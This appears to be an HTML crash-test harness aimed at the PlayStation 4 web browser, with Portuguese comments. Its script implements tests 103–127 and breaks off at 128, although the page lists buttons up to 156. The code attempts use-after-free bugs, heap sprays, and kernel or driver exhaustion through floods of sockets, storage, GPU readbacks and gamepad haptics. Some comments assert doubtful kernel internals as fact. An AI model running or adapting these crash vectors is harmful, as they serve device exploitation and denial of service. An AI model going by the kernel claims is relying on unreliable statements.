<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 FATAL V17 (LEGACY/BEACON/HISTORY)</title>
</head>
<body>

<h1>PS4 FATAL VECTORS V17</h1>

<button onclick="runTest103()">103. Range.surroundContents Mutation UAF</button>
<button onclick="runTest104()">104. HTMLMarqueeElement Layout Thrash</button>
<button onclick="runTest105()">105. XHR Document Response Parsing Race</button>
<button onclick="runTest106()">106. SendBeacon Blob Buffer Race</button>
<button onclick="runTest107()">107. Canvas Pattern VRAM Fragmentation</button>
<button onclick="runTest108()">108. History State Serialization Bomb</button>
<button onclick="runTest109()">109. DOMTokenList Toggle Recursion UAF</button>
<button onclick="runTest110()">110. XPathEvaluator Iterator Invalidation</button>
<button onclick="runTest111()">111. SVGPointList AppendItem Race</button>
<button onclick="runTest112()">112. LocalStorage FS Sync Quota Panic</button>
<button onclick="runTest113()">113. Recursive Blob URI Lookup Stack Overflow</button>
<button onclick="runTest114()">114. Worker Sync XHR Connection Flood</button>
<button onclick="runTest115()">115. Selection.modify Caret UAF</button>
<button onclick="runTest116()">116. CSSKeyframesRule Mutation Crash</button>
<button onclick="runTest117()">117. HTMLOptionsCollection Length UAF</button>
<button onclick="runTest118()">118. Canvas.toBlob GPU Readback Panic</button>
<button onclick="runTest119()">119. Gamepad SharedMem Polling Flood</button>
<button onclick="runTest120()">120. Blob View Offset Alignment Panic</button>
<button onclick="runTest121()">121. AbortSignal EventListener UAF</button>
<button onclick="runTest122()">122. DataTransferItemList Mode Confusion</button>
<button onclick="runTest123()">123. HTMLTableElement Caption Scope Race</button>
<button onclick="runTest124()">124. Base64 Encoder Integer Overflow</button>
<button onclick="runTest125()">125. Gamepad Haptic Effect Buffer Flood</button>
<button onclick="runTest126()">126. Image Decode vs RevokeObjectURL Race</button>
<button onclick="runTest127()">127. StructuredClone Proxy Trap UAF</button>
<button onclick="runTest128()">128. FontFace Set Loading Race</button>
<button onclick="runTest129()">129. Comment Node Normalize Corruption</button>
<button onclick="runTest130()">130. FormData Filename Overflow Panic</button>
<button onclick="runTest131()">131. Microtask Queue Watchdog Timeout</button>
<button onclick="runTest132()">132. Recursive Blob URL Stack Smash</button>
<button onclick="runTest133()">133. WeakMap Key GC Re-entry UAF</button>
<button onclick="runTest134()">134. ResizeObserver Callback Detach Race</button>
<button onclick="runTest135()">135. DOMMatrix Singular Inversion Crash</button>
<button onclick="runTest136()">136. IndexedDB Transaction Commit/Abort Race</button>
<button onclick="runTest137()">137. SVG Filter DisplacementMap Buffer Overflow</button>
<button onclick="runTest138()">138. Cookie Header Mbuf Exhaustion</button>
<button onclick="runTest139()">139. Array.reverse Accessor Mutator</button>
<button onclick="runTest140()">140. DOMParser XML Recursive Entity</button>
<button onclick="runTest141()">141. NodeIterator Filter Detach UAF</button>
<button onclick="runTest142()">142. AudioContext Decode Buffer Race</button>
<button onclick="runTest143()">143. Window.name IPC Buffer Overflow</button>
<button onclick="runTest144()">144. ImageData Constructor Int Overflow</button>
<button onclick="runTest145()">145. SVG Use Element Shadow Tree UAF</button>
<button onclick="runTest146()">146. Location AncestorOrigins Iterator Crash</button>
<button onclick="runTest147()">147. FormControls NamedGetter Cache Poison</button>
<button onclick="runTest148()">148. HRTF Panner Database Loader Panic</button>
<button onclick="runTest149()">149. Notification IPC Body Flood</button>
<button onclick="runTest150()">150. File LastModified Timestamp Overflow</button>

<button onclick="runTest151()">151. ExecCommand InsertHTML Nesting Smash</button>
<button onclick="runTest152()">152. CSSStyleSheet Recursive Import Bomb</button>
<button onclick="runTest153()">153. CustomElement Constructor DOM Trap</button>

<button onclick="runTest154()">154. MediaSource Buffer Append/Abort Race</button>
<button onclick="runTest155()">155. Crypto GetRandomValues Page Boundary</button>
<button onclick="runTest156()">156. Fetch Upload Stream Network Flood</button>

<div id="log">Logs:</div>

<script>
function log(msg) {
    var d = document.createElement("div");
    d.innerText = "> " + msg;
    document.getElementById("log").appendChild(d);
}

// 103. Range.surroundContents Mutation UAF (WebKit)
// Vetor Exclusivo: Range.surroundContents.
// Lógica: Este método move nós para um novo pai. Usamos um evento de mutação (DOMNodeInserted)
// que dispara no meio do processo de movimento para alterar a árvore DOM que o C++ está iterando.
function runTest103() {
    log("103. Range Surround...");
    try {
        var root = document.createElement('div');
        var p = document.createElement('p');
        var t = document.createTextNode("payload");
        p.appendChild(t);
        root.appendChild(p);
        document.body.appendChild(root);
        
        var range = document.createRange();
        range.selectNode(t);
        
        var wrapper = document.createElement('div');
        
        // O evento dispara quando 'wrapper' é inserido, mas antes do conteúdo ser movido totalmente
        root.addEventListener('DOMNodeInserted', function(e) {
            if(e.target === wrapper) {
                try {
                    // Remove o nó de texto que o Range está tentando encapsular
                    p.removeChild(t); 
                    log("Mutation triggered: Node removed");
                } catch(z) { log("Mutation fail: " + z); }
            }
        });
        
        // Dispara a operação
        range.surroundContents(wrapper);
        log("Result: Operation finished (Check for crash)");
    } catch(e) { log("Error: " + e); }
}

// 104. HTMLMarqueeElement Layout Thrash (WebKit)
// Vetor Exclusivo: Legacy <marquee> tag.
// Lógica: O elemento marquee possui timers internos complexos para animação.
// Manipular 'direction' e 'scrollAmount' enquanto se anexa/desanexa o nó
// estressa o sistema de layout e temporizadores internos do WebKit antigo.
function runTest104() {
    log("104. Marquee Thrash...");
    var m = document.createElement('marquee');
    m.textContent = "CRASH TEST ".repeat(100);
    document.body.appendChild(m);
    
    var count = 0;
    var i = setInterval(function() {
        try {
            m.start();
            m.direction = (count % 2 === 0) ? "left" : "right";
            m.scrollAmount = Math.random() * 1000;
            
            // Força recálculo de layout crítico
            var h = m.offsetHeight; 
            
            // Remove e adiciona rapidamente para resetar o timer interno
            document.body.removeChild(m);
            document.body.appendChild(m);
            m.stop();
            
            count++;
            if(count > 100) {
                clearInterval(i);
                log("Success: Marquee cycle completed");
            }
        } catch(e) { log("Error: " + e); }
    }, 10);
}

// 105. XHR Document Response Parsing Race (WebKit)
// Vetor Exclusivo: XHR responseType='document'.
// Lógica: Faz o XHR parsear HTML em background. Aborta a requisição
// no meio do parsing e tenta acessar a propriedade 'responseXML'.
// Visa causar UAF no parser HTML assíncrono.
function runTest105() {
    log("105. XHR Doc Race...");
    var i = setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.responseType = "document";
        // URL que retorna dados para parsear
        xhr.open("GET", window.location.href, true); 
        
        xhr.onreadystatechange = function() {
            if(xhr.readyState === 3) { // LOADING
                // Tenta acessar o documento parcial
                try {
                    var doc = xhr.responseXML;
                    if(doc) {
                        var div = doc.createElement('div'); // Manipula documento instável
                    }
                    xhr.abort(); // Mata o parser
                } catch(e) {}
            }
        };
        xhr.send();
        
        // Cleanup
        setTimeout(function(){ 
            if(xhr.readyState !== 4) xhr.abort(); 
        }, 50);
    }, 20);
    
    setTimeout(function(){ 
        clearInterval(i); 
        log("Success: XHR race finished");
    }, 3000);
}

// 106. SendBeacon Blob Buffer Race (Kernel)
// Vetor Exclusivo: Navigator.sendBeacon.
// Lógica: sendBeacon é fire-and-forget. Enviamos um Blob e revogamos seu URL/destruímos buffer
// imediatamente. O Kernel tenta ler o buffer para enviar a rede enquanto o JS o invalida.
function runTest106() {
    log("106. Beacon Race...");
    if(!navigator.sendBeacon) { log("No Beacon API"); return; }
    
    var data = new Uint8Array(1024 * 1024 * 2); // 2MB
    var blob = new Blob([data]);
    var count = 0;
    
    var i = setInterval(function() {
        // Envia para endpoint dummy
        var res = navigator.sendBeacon("/beacon_crash_" + count, blob);
        
        // Tenta destruir a referência de memória imediatamente
        // Em um sistema sem GC preciso, isso cria pressão na thread de rede
        var tempBlob = blob.slice(0, 10); 
        
        count++;
        if(count > 50) {
            clearInterval(i);
            log("Success: Beacons sent: " + count);
        }
    }, 20);
}

// 107. Canvas Pattern VRAM Fragmentation (Kernel)
// Vetor Exclusivo: Canvas Patterns & GPU Drivers.
// Lógica: Cria padrões de preenchimento a partir de canvases, redimensiona os canvases fonte
// e usa os padrões invalidados. Isso força o driver de vídeo a gerenciar texturas órfãs.
function runTest107() {
    log("107. VRAM Frag...");
    var src = document.createElement('canvas');
    src.width = 512; src.height = 512;
    var sCtx = src.getContext('2d');
    sCtx.fillRect(0,0,512,512);
    
    var dest = document.createElement('canvas');
    dest.width = 1024; dest.height = 1024;
    var dCtx = dest.getContext('2d');
    
    var i = setInterval(function() {
        try {
            // Cria padrão ligado à textura atual de 'src'
            var p = dCtx.createPattern(src, 'repeat');
            
            // Redimensiona 'src' -> Invalida/Realoca textura de origem
            src.width = (src.width === 512) ? 513 : 512;
            
            // Usa o padrão que aponta para textura antiga
            dCtx.fillStyle = p;
            dCtx.fillRect(0, 0, 1024, 1024);
        } catch(e) { log("Err: " + e); }
    }, 10);
    
    setTimeout(function() { 
        clearInterval(i); 
        log("Success: VRAM stress complete");
    }, 4000);
}

// 108. History State Serialization Bomb (Kernel)
// Vetor Exclusivo: History API Buffer Overflow.
// Lógica: history.replaceState serializa objetos usando structured clone.
// Passamos um objeto profundamente recursivo e massivo para estourar o buffer de IPC
// que comunica o estado da sessão para o processo Kernel/System.
function runTest108() {
    log("108. History Bomb...");
    var root = {};
    var curr = root;
    // Cria lista ligada profunda (Profundidade 5000)
    for(var i=0; i<5000; i++) {
        curr.next = { val: i, buffer: new Uint8Array(128) };
        curr = curr.next;
    }
    
    try {
        // Tenta serializar e passar para o kernel
        history.replaceState(root, "bomb", window.location.href);
        log("Success: State replaced (Buffer handled)");
    } catch(e) {
        log("Success: Kernel rejected/Exception: " + e);
        // Retry com buffer maior para tentar overflow de borda
        try {
            var flat = new Array(100000).fill(1);
            history.replaceState(flat, "flat", window.location.href);
        } catch(z) {}
    }
}
// 109. DOMTokenList Toggle Recursion UAF (WebKit)
// Vetor Exclusivo: classList (DOMTokenList).
// Lógica: Manipula classes CSS via 'classList.toggle'. Adiciona um MutationObserver
// que observa a mudança de atributos. Quando o atributo muda, forçamos outra mudança
// na mesma lista. Isso pode corromper o iterador de strings da lista de classes no C++.
function runTest109() {
    log("109. ClassList Recursion...");
    var div = document.createElement('div');
    div.classList.add("a", "b", "c");
    document.body.appendChild(div);

    var count = 0;
    var obs = new MutationObserver(function() {
        if(count > 100) return;
        count++;
        // Recursão síncrona: Modifica a lista enquanto o motor notifica a mudança anterior
        try {
            // Toggle força re-parse do atributo 'class'
            div.classList.toggle("force_realloc_" + count);
            div.classList.remove("a");
            
            // Força acesso ao DOMTokenList potencialmente inválido
            var len = div.classList.length;
            if(count % 50 === 0) log("TokenList length: " + len);
        } catch(e) {
            log("Fail/Catch: " + e);
        }
    });

    obs.observe(div, {attributes: true, attributeFilter: ['class']});
    
    // Gatilho
    try {
        div.classList.toggle("start");
        log("Success: Cycle finished (No crash)");
    } catch(e) { log("Error: " + e); }
}

// 110. XPathEvaluator Iterator Invalidation (WebKit)
// Vetor Exclusivo: XPath (libxml2 wrapper).
// Lógica: Executa uma query XPath que retorna um iterador de nós.
// Durante a iteração, modificamos a árvore DOM removendo os nós que ainda
// não foram visitados pelo iterador XPath, tentando causar Use-After-Free.
function runTest110() {
    log("110. XPath Iterator...");
    var doc = document.implementation.createDocument(null, "root", null);
    var root = doc.documentElement;
    for(var i=0; i<1000; i++) {
        var el = doc.createElement("item");
        el.setAttribute("id", i);
        root.appendChild(el);
    }

    var evaluator = new XPathEvaluator();
    // Retorna iterador ordenado
    var result = evaluator.evaluate("//item", doc, null, XPathResult.ORDERED_NODE_ITERATOR_TYPE, null);
    var node;
    var count = 0;

    try {
        while(node = result.iterateNext()) {
            count++;
            if(count === 10) {
                // MUTAÇÃO: Remove todos os filhos restantes
                root.textContent = ""; 
                // Preenche memória
                var junk = new Array(1000).fill("A".repeat(100));
            }
            // Tenta continuar a iteração em uma árvore vazia/inválida
        }
        log("Success: Iteration handled safely. Count: " + count);
    } catch(e) {
        log("Fail/Error: " + e); // WebKit pode lançar erro de estado inválido
    }
}

// 111. SVGPointList AppendItem Race (WebKit)
// Vetor Exclusivo: SVG DOM List Interfaces.
// Lógica: Manipula listas de pontos de um polígono SVG. O método 'appendItem'
// retorna o item inserido. Se manipularmos o SVG (removendo do DOM) e tentarmos
// acessar o item retornado, podemos acessar memória de um objeto SVG desligado.
function runTest111() {
    log("111. SVGPointList Race...");
    var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    var poly = document.createElementNS("http://www.w3.org/2000/svg", "polygon");
    svg.appendChild(poly);
    document.body.appendChild(svg);

    var points = poly.points; // SVGPointList
    
    try {
        for(var i=0; i<500; i++) {
            var pt = svg.createSVGPoint();
            pt.x = i; pt.y = i;
            
            // Retorna referência ao objeto inserido na lista
            var ref = points.appendItem(pt);
            
            if(i === 250) {
                // Destrói o contexto SVG
                document.body.removeChild(svg);
                poly = null;
                // Tenta modificar o ponto que agora pertence a uma lista órfã
                ref.x = 9999; 
            }
        }
        log("Success: Points appended. List length: " + points.numberOfItems);
    } catch(e) {
        log("Fail: " + e);
    }
}

// 112. LocalStorage FS Sync Quota Panic (Kernel)
// Vetor Exclusivo: File System Quota Management.
// Lógica: LocalStorage é síncrono e mapeado em disco. Enchemos o storage até o erro de quota,
// depois limpamos e enchemos novamente em loop rápido. Isso estressa o driver de sistema de arquivos
// e a sincronização de cache de páginas do kernel.
function runTest112() {
    log("112. Storage Quota Panic...");
    var key = "stress_test";
    var chunk = "X".repeat(1024 * 1024); // 1MB chunks
    var i = 0;
    
    var interval = setInterval(function() {
        try {
            // Tenta escrever até estourar
            var current = localStorage.getItem(key) || "";
            localStorage.setItem(key, current + chunk);
            i++;
        } catch(e) {
            // Atingiu quota (geralmente ~5MB)
            // Limpa imediatamente para forçar flush/delete no disco
            localStorage.removeItem(key);
            
            // Tenta escrever imediatamente após remover
            // Race condition no vnode do arquivo .localstorage
            try { localStorage.setItem(key, "restart"); } catch(z){}
            
            if(i > 20) {
                clearInterval(interval);
                log("Success: Quota cycled 20 times");
            }
        }
    }, 10);
}

// 113. Recursive Blob URI Lookup Stack Overflow (Kernel)
// Vetor Exclusivo: VFS Name Resolution Recursion.
// Lógica: Cria um Blob. Cria uma URL para ele. Cria um NOVO Blob contendo o texto da URL do anterior.
// Repete isso 1000 vezes. Tenta ler o último Blob.
// Se o sistema de arquivos tentar resolver recursivamente as URLs internas, pode estourar a stack.
function runTest113() {
    log("113. Recursive Blob URI...");
    var lastUrl = "start";
    
    try {
        for(var i=0; i<2000; i++) {
            var content = "Reference to: " + lastUrl;
            var b = new Blob([content]);
            lastUrl = URL.createObjectURL(b);
        }
        
        // Tenta ler o final da cadeia
        var xhr = new XMLHttpRequest();
        xhr.open("GET", lastUrl, true);
        xhr.send();
        
        log("Success: Created chain of 2000 Blob URIs");
        
        // Limpeza massiva para estressar o desalocador
        setTimeout(function(){
            // Não revogamos explicitamente para deixar o GC do kernel trabalhar
            log("Waiting for Kernel GC...");
        }, 1000);
    } catch(e) {
        log("Fail: " + e);
    }
}

// 114. Worker Sync XHR Connection Flood (Kernel)
// Vetor Exclusivo: Network Socket Exhaustion (Blocking).
// Lógica: Cria Workers que abrem conexões síncronas (bloqueantes) para portas aleatórias locais.
// O objetivo não é conectar, mas consumir descritores de arquivo (sockets) e threads de kernel 
// que ficam aguardando timeout de conexão (SYN_SENT).
function runTest114() {
    log("114. Worker Socket Flood...");
    var script = `
        onmessage = function(id) {
            try {
                var xhr = new XMLHttpRequest();
                // Porta aleatória para evitar cache de conexão falha
                var port = 10000 + Math.floor(Math.random() * 50000);
                // Sync request bloqueia a thread do worker
                xhr.open("GET", "http://127.0.0.1:" + port, false);
                xhr.send();
            } catch(e) {}
            postMessage("done");
        }
    `;
    var url = URL.createObjectURL(new Blob([script], {type:'text/javascript'}));
    var workers = [];
    
    var i = setInterval(function() {
        var w = new Worker(url);
        w.postMessage(0);
        workers.push(w);
        
        // Mantém 50 threads bloqueadas em syscall de rede simultaneamente
        if(workers.length > 50) {
            var old = workers.shift();
            old.terminate(); // Força sinal SIGKILL no socket
        }
    }, 20);
    
    setTimeout(function() {
        clearInterval(i);
        workers.forEach(w => w.terminate());
        log("Success: Flood cycle complete");
    }, 5000);
}
// 115. Selection.modify Caret UAF (WebKit)
// Vetor Exclusivo: Selection API (Granularity).
// Lógica: Usa o método não padronizado 'modify' (suportado no WebKit) para mover
// o cursor de texto (caret) por "sentenças". Removemos o nó para onde o cursor
// está indo durante o cálculo do movimento.
function runTest115() {
    log("115. Selection Modify...");
    var div = document.createElement('div');
    div.contentEditable = "true";
    var p1 = document.createElement('p'); p1.textContent = "Sentence one.";
    var p2 = document.createElement('p'); p2.textContent = "Sentence two.";
    div.appendChild(p1);
    div.appendChild(p2);
    document.body.appendChild(div);
    div.focus();
    
    var sel = window.getSelection();
    sel.collapse(p1, 0); // Cursor no início
    
    try {
        // Observer para pegar o momento que o WebKit percorre o DOM para achar a próxima sentença
        // Nota: modify() é síncrono, mas eventos de foco/blur podem disparar
        for(var i=0; i<100; i++) {
            // Move cursor adiante
            sel.modify("move", "forward", "sentence");
            
            // Destroi p2 se o cursor estiver nele
            if(sel.anchorNode === p2.firstChild || sel.anchorNode === p2) {
                div.removeChild(p2);
                p2 = document.createElement('p'); p2.textContent = "Reset.";
                div.appendChild(p2);
                
                // Spray para ocupar memória
                var junk = new Array(100).fill(1);
            }
        }
        log("Success: Selection moved without crash. Pos: " + sel.anchorOffset);
    } catch(e) {
        log("Fail: " + e);
    }
}

// 116. CSSKeyframesRule Mutation Crash (WebKit)
// Vetor Exclusivo: CSSOM (CSS Object Model).
// Lógica: Cria uma regra de animação (@keyframes) e itera sobre suas regras internas.
// Deleta regras enquanto itera, tentando invalidar o iterador interno da coleção CSSRuleList.
function runTest116() {
    log("116. Keyframes Mutation...");
    var style = document.createElement('style');
    document.head.appendChild(style);
    
    try {
        // Insere @keyframes
        var name = "anim_" + Date.now();
        style.sheet.insertRule("@keyframes " + name + " { from {opacity:0;} to {opacity:1;} }", 0);
        var keyframes = style.sheet.cssRules[0];
        
        // Adiciona muitas regras
        for(var i=0; i<500; i++) {
            keyframes.appendRule(i + "% { top: " + i + "px; }");
        }
        
        log("Rules created: " + keyframes.cssRules.length);
        
        // Iteração destrutiva
        // O WebKit antigo pode não atualizar o comprimento da lista em tempo real durante o loop
        for(var k=0; k<keyframes.cssRules.length; k++) {
            if(k % 2 === 0) {
                keyframes.deleteRule(k.toString() + "%");
                // Tenta acessar regra deletada
                var ghost = keyframes.cssRules[k];
            }
        }
        log("Success: Rules remaining: " + keyframes.cssRules.length);
    } catch(e) {
        log("Fail: " + e);
    } finally {
        document.head.removeChild(style);
    }
}

// 117. HTMLOptionsCollection Length UAF (WebKit)
// Vetor Exclusivo: Legacy Form Collections.
// Lógica: A propriedade 'length' de um <select> é gravável. Definir como 0 libera memória.
// Definir como N aloca. Fazemos isso em loop rápido enquanto tentamos acessar propriedades
// dos elementos options que deveriam ter sido destruídos.
function runTest117() {
    log("117. Options Length...");
    var sel = document.createElement('select');
    // Alocação inicial massiva
    sel.length = 10000;
    
    try {
        // Define propriedades para garantir alocação real de objetos JS wrappers
        for(var i=0; i<100; i++) sel.options[i].value = "val" + i;
        
        var ref = sel.options[50]; // Mantém referência viva
        
        // Liberação abrupta
        sel.length = 0;
        
        // Re-alocação rápida
        sel.length = 500;
        
        // UAF check: 'ref' deve estar desconectado ("detached") ou morto
        // Se o motor reutilizou o endereço de memória para os novos options, 'ref' pode estar corrompido
        ref.text = "crash"; 
        
        log("Success: Reference text: " + ref.text);
    } catch(e) {
        log("Fail: " + e);
    }
}

// 118. Canvas.toBlob GPU Readback Panic (Kernel)
// Vetor Exclusivo: GPU Texture Readback.
// Lógica: toBlob força a GPU a enviar dados da textura para a RAM do sistema (assíncrono).
// Redimensionamos o canvas imediatamente após pedir o Blob. O driver da GPU pode tentar
// ler de uma textura que foi destruída ou realocada.
function runTest118() {
    log("118. GPU Readback...");
    var c = document.createElement('canvas');
    c.width = 4096; c.height = 4096; // Textura grande (64MB raw)
    var ctx = c.getContext('2d');
    ctx.fillStyle = "red";
    ctx.fillRect(0,0,4096,4096);
    
    var count = 0;
    var i = setInterval(function() {
        // Dispara operação assíncrona pesada no driver de vídeo
        c.toBlob(function(b) {
            // Callback (pode nunca ser chamado se crashar antes)
            count++;
        });
        
        // Race: Invalida a textura imediatamente
        c.width = (c.width === 4096) ? 100 : 4096;
        
        if(count > 20) {
            clearInterval(i);
            log("Success: GPU survived readbacks");
        }
    }, 50);
}

// 119. Gamepad SharedMem Polling Flood (Kernel)
// Vetor Exclusivo: HID Driver / Shared Memory.
// Lógica: O API de Gamepad lê de uma região de memória compartilhada mapeada pelo kernel.
// Workers múltiplos fazendo polling agressivo podem causar contenção de lock ou leitura de estado inconsistente.
function runTest119() {
    log("119. Gamepad Poll...");
    if(!navigator.getGamepads) { log("No Gamepad API"); return; }
    
    var code = `
        setInterval(function() {
            // Polling agressivo (tight loop virtual)
            var pads = navigator.getGamepads();
            // Tenta acessar propriedades para forçar leitura de memória
            if(pads[0]) var x = pads[0].axes[0];
        }, 1);
    `;
    var url = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var workers = [];
    
    for(var k=0; k<10; k++) {
        workers.push(new Worker(url));
    }
    
    setTimeout(function() {
        workers.forEach(w => w.terminate());
        log("Success: Polling completed. Workers stopped.");
    }, 4000);
}

// 120. Blob View Offset Alignment Panic (Kernel)
// Vetor Exclusivo: Memory Alignment / Buffer Overread.
// Lógica: Cria Blobs a partir de Views (Float64Array) que têm offsets de byte desalinhados
// ou que apontam para o final exato do buffer. Testamos se o copiador de memória do Kernel
// respeita estritamente os limites ao serializar para disco/rede.
function runTest120() {
    log("120. Blob Offset...");
    var buffer = new ArrayBuffer(1024);
    // Offset 1016 (8 bytes restantes)
    var view = new Float64Array(buffer, 1016, 1); 
    
    try {
        var blob = new Blob([view]);
        var reader = new FileReader();
        
        reader.onload = function() {
            log("Success: Read " + reader.result.byteLength + " bytes");
            
            // Teste estendido: Offset inválido (se JS permitisse, mas forçamos limites)
            // Cria multiplos blobs pequenos para fragmentar
            var blobs = [];
            for(var i=0; i<1000; i++) blobs.push(new Blob([view]));
            log("Created 1000 fragments");
        };
        
        reader.onerror = function() { log("Reader Error"); };
        reader.readAsArrayBuffer(blob);
        
    } catch(e) {
        log("Fail: " + e);
    }
}
// 121. AbortSignal EventListener UAF (WebKit)
// Vetor Exclusivo: AbortController API.
// Lógica: Adiciona um EventListener passando um 'signal'. Dentro do handler do evento,
// chamamos controller.abort(). O WebKit tenta remover o listener da lista enquanto
// ainda está iterando sobre ela para despachar o evento.
function runTest121() {
    log("121. Abort UAF...");
    var ac = new AbortController();
    var el = document.createElement('div');
    var count = 0;
    
    try {
        // Configura listener vinculado ao sinal de aborto
        el.addEventListener('test', function() {
            count++;
            // MUTAÇÃO: Abortar remove o listener imediatamente
            if(count === 1) {
                ac.abort(); 
                // Tenta forçar GC ou reuso de slot
                var arr = [];
                for(var i=0; i<1000; i++) arr.push({a:1});
            }
        }, { signal: ac.signal });
        
        // Dispara o evento múltiplas vezes
        // O primeiro disparo aborta, o motor deve lidar com a remoção segura
        el.dispatchEvent(new Event('test'));
        el.dispatchEvent(new Event('test'));
        
        log("Success: Event dispatched without crash. Count: " + count);
    } catch(e) {
        log("Fail: " + e);
    }
}

// 122. DataTransferItemList Mode Confusion (WebKit)
// Vetor Exclusivo: Drag and Drop API.
// Lógica: A lista de itens de um DragEvent tem modos (Read/Write/Protected).
// Tentamos adicionar itens, e num getter de propriedade, alteramos o modo disparando
// outro evento, tentando confundir a máquina de estados interna do DataTransfer.
function runTest122() {
    log("122. DataTransfer Confusion...");
    var dt = new DataTransfer();
    
    try {
        // Adiciona um arquivo fictício
        var file = new File(["content"], "test.txt", {type: "text/plain"});
        dt.items.add(file);
        
        // Define propriedade maliciosa no protótipo de File para interceptar acesso
        Object.defineProperty(file, "type", {
            get: function() {
                // Tenta limpar a lista enquanto o motor lê o tipo do arquivo
                dt.items.clear();
                // Alocação para preencher buracos
                var junk = new Uint8Array(1024);
                return "text/html";
            },
            configurable: true
        });
        
        // Acesso que dispara o getter
        var type = dt.items[0].type;
        log("Success: Accessed type: " + type);
    } catch(e) {
        log("Fail: " + e);
    }
}

// 123. HTMLTableElement Caption Scope Race (WebKit)
// Vetor Exclusivo: HTML Table Layout.
// Lógica: Tabelas têm lógica complexa para 'caption'. Criamos uma caption,
// e durante a inserção (DOMNodeInserted), movemos essa caption para OUTRA tabela.
// O renderizador da primeira tabela pode tentar acessar a caption que foi roubada.
function runTest123() {
    log("123. Table Caption Race...");
    var t1 = document.createElement('table');
    var t2 = document.createElement('table');
    document.body.appendChild(t1);
    document.body.appendChild(t2);
    
    var caption = t1.createCaption(); // Cria e anexa a t1
    caption.textContent = "Moving Target";
    
    // Configura a armadilha
    t1.addEventListener('DOMNodeInserted', function(e) {
        if(e.target === caption) {
            try {
                // Rouba a caption para t2 no meio do processo de anexo a t1
                t2.appendChild(caption);
                // Destrói t1
                document.body.removeChild(t1);
                var f = new Float64Array(1000);
            } catch(z) {}
        }
    });
    
    try {
        // Força reinserção para disparar evento
        t1.removeChild(caption);
        t1.appendChild(caption); 
        log("Success: Table layout survived re-parenting");
    } catch(e) {
        log("Fail: " + e);
    }
}

// 124. Base64 Encoder Integer Overflow (Kernel)
// Vetor Exclusivo: FileReader DataURL Encoding.
// Lógica: DataURL usa Base64. O tamanho de saída é aprox 4/3 do input.
// Se criarmos um Blob virtualmente gigante (via slicing) e pedirmos DataURL,
// o cálculo do tamanho do buffer de string no Kernel pode sofrer overflow (wrap around).
function runTest124() {
    log("124. Base64 Overflow...");
    // Cria um blob base
    var chunk = new Uint8Array(1024*1024); // 1MB
    var blob = new Blob([chunk]);
    
    // Cria um blob virtual gigante repetindo o chunk (sem alocar RAM real ainda)
    var parts = [];
    for(var i=0; i<2500; i++) parts.push(blob); // ~2.5GB virtual
    var hugeBlob = new Blob(parts);
    
    var fr = new FileReader();
    fr.onload = function() { log("Success: Encoded (Unlikely)"); };
    fr.onerror = function() { log("Success: Kernel rejected size (Safe)"); };
    
    try {
        // O Kernel tenta alocar buffer para string: (2.5GB * 1.33) > 3GB (limite 32bit userland)
        fr.readAsDataURL(hugeBlob);
        log("Processing: Sending read syscall...");
    } catch(e) {
        log("Fail: JS Error: " + e);
    }
}

// 125. Gamepad Haptic Effect Buffer Flood (Kernel)
// Vetor Exclusivo: HID Driver / Vibration Actuator.
// Lógica: Envia comandos de vibração ("dual-rumble") para o controle.
// Floodando essa chamada com durações extremas ou arrays inválidos tenta corromper
// o buffer de comando USB/Bluetooth no driver HID do Kernel.
function runTest125() {
    log("125. Haptic Flood...");
    if(!navigator.getGamepads) { log("Fail: No Gamepad API"); return; }
    
    // Simula loop de jogo
    var i = setInterval(function() {
        var pads = navigator.getGamepads();
        var pad = pads[0]; // Assume controle conectado (comum no PS4)
        
        if(pad && pad.vibrationActuator) {
            try {
                // Envia comando de vibração complexo
                pad.vibrationActuator.playEffect("dual-rumble", {
                    startDelay: 0,
                    duration: 10000, // Duração longa para manter driver ocupado
                    weakMagnitude: 1.0,
                    strongMagnitude: 1.0
                });
                
                // Sobrecarga: Chama reset imediatamente
                pad.vibrationActuator.reset();
            } catch(e) {}
        } else {
            // Mock para logica se sem controle
             var mock = new Uint8Array(1024); // Simula carga
        }
    }, 10); // 100Hz flood
    
    setTimeout(function() {
        clearInterval(i);
        log("Success: Haptic commands sent");
    }, 4000);
}

// 126. Image Decode vs RevokeObjectURL Race (Kernel)
// Vetor Exclusivo: Image Decoder Threading.
// Lógica: Atribuir um Blob URL a uma Image dispara o download e decode em threads separadas.
// Revogamos o URL imediatamente. O objetivo é que o decodificador tente ler de um 
// 'vnode' (arquivo virtual) que acabou de ser fechado/liberado.
function runTest126() {
    log("126. Img Decode Race...");
    var data = new Uint8Array(1024*1024*2); // 2MB Noise
    for(var i=0; i<data.length; i++) data[i] = Math.random() * 255;
    var blob = new Blob([data], {type: 'image/png'}); // Tipo fake para forçar parser a trabalhar
    
    var count = 0;
    var timer = setInterval(function() {
        var url = URL.createObjectURL(blob);
        var img = new Image();
        
        // Inicia decode
        img.src = url;
        
        // Race: Destrói a referência no VFS imediatamente
        URL.revokeObjectURL(url);
        
        // Tenta desenhar no canvas para forçar acesso aos dados de pixel
        // mesmo que a imagem esteja quebrada/incompleta
        try {
            var c = document.createElement('canvas');
            c.getContext('2d').drawImage(img, 0, 0);
        } catch(e) {}
        
        count++;
        if(count > 50) {
            clearInterval(timer);
            log("Success: Race cycles completed: " + count);
        }
    }, 20);
}
// 127. StructuredClone Proxy Trap UAF (WebKit)
// Vetor Exclusivo: Serialização de Objetos via Proxy.
// Lógica: Usamos postMessage para clonar um objeto. O objeto é um Proxy.
// Quando o algoritmo de clonagem lê uma propriedade, o Proxy detona o buffer original.
// O WebKit continua lendo a memória agora inválida.
function runTest127() {
    log("127. Proxy Clone...");
    var buffer = new ArrayBuffer(1024 * 1024);
    var view = new Uint8Array(buffer);
    
    var evil = new Proxy({ data: view }, {
        get: function(target, prop) {
            if (prop === 'data') {
                // Trap: Detona o buffer durante a leitura
                try {
                    // Transfere o buffer para um worker (neutering)
                    var w = new Worker(URL.createObjectURL(new Blob([''],{type:'text/javascript'})));
                    w.postMessage(buffer, [buffer]);
                    w.terminate();
                    
                    log("Trap executed: Buffer detached");
                } catch(e) { return new Uint8Array(0); }
            }
            return Reflect.get(target, prop);
        }
    });

    try {
        // Inicia a clonagem estruturada
        window.postMessage(evil, "*");
        
        // Verifica se sobreviveu
        setTimeout(function() {
            log("Success: Message posted (No Crash). View len: " + view.byteLength);
        }, 1000);
    } catch(e) { log("Fail: " + e); }
}

// 128. FontFace Set Loading Race (WebKit)
